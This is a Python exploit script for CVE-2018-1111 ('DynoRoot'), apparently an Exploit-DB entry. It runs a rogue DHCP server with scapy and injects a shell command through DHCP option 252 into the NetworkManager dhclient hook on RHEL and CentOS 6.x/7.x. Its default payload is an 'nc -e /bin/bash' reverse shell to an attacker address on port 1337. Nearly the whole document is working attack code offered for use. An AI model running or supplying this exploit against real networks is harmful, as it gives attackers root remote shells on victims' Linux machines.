# Exploit Author: Kevin Kirsche
# Exploit Repository: https://github.com/kkirsche/CVE-2018-1111
# Exploit Discoverer: Felix Wilhelm
# Vendor Homepage: https://www.redhat.com/
# Version: RHEL 6.x / 7.x and CentOS 6.x/7.x
# Tested on: CentOS Linux release 7.4.1708 (Core)  / NetworkManager 1.8.0-11.el7_4
# CVE : CVE-2018-1111
 
#!/usr/bin/env python
 
from argparse import ArgumentParser
from scapy.all import BOOTP_am, DHCP
from scapy.base_classes import Net
 
 
class DynoRoot(BOOTP_am):
    function_name = "dhcpd"
 
    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]
            dhcp_options += [("server_id", self.gw),
                             ("domain", self.domain),
                             ("router", self.gw),
                             ("name_server", self.gw),
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             (252, "x&#039;&{payload} #".format(payload=self.payload)),
                             "end"
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp
 
 
if __name__ == &#039;__main__&#039;:
    parser = ArgumentParser(description=&#039;CVE-2018-1111 DynoRoot exploit&#039;)
 
    parser.add_argument(&#039;-i&#039;, &#039;--interface&#039;, default=&#039;eth0&#039;, type=str,
                        dest=&#039;interface&#039;,
                        help=&#039;The interface to listen for DHCP requests on (default: eth0)&#039;)
    parser.add_argument(&#039;-s&#039;, &#039;--subnet&#039;, default=&#039;192.168.41.0/24&#039;, type=str,
                        dest=&#039;subnet&#039;, help=&#039;The network to assign via DHCP (default: 192.168.41.0/24)&#039;)
    parser.add_argument(&#039;-g&#039;, &#039;--gateway&#039;, default=&#039;192.168.41.254&#039;, type=str,
                        dest=&#039;gateway&#039;, help=&#039;The network gateway to respond with (default: 192.168.41.254)&#039;)
    parser.add_argument(&#039;-d&#039;, &#039;--domain&#039;, default=&#039;victim.net&#039;, type=str,
                        dest=&#039;domain&#039;, help=&#039;Domain to assign (default: victim.net)&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--payload&#039;, default=&#039;nc -e /bin/bash 192.168.41.2 1337&#039;, type=str,
                        dest=&#039;payload&#039;, help=&#039;The payload / command to inject (default: nc -e /bin/bash 192.168.41.2 1337)&#039;)
 
    args = parser.parse_args()
    server = DynoRoot(iface=args.interface, domain=args.domain,
                      pool=Net(args.subnet),
                      network=args.subnet,
                      gw=args.gateway,
                      renewal_time=600, lease_time=3600)
    server.payload = args.payload
 
    server()

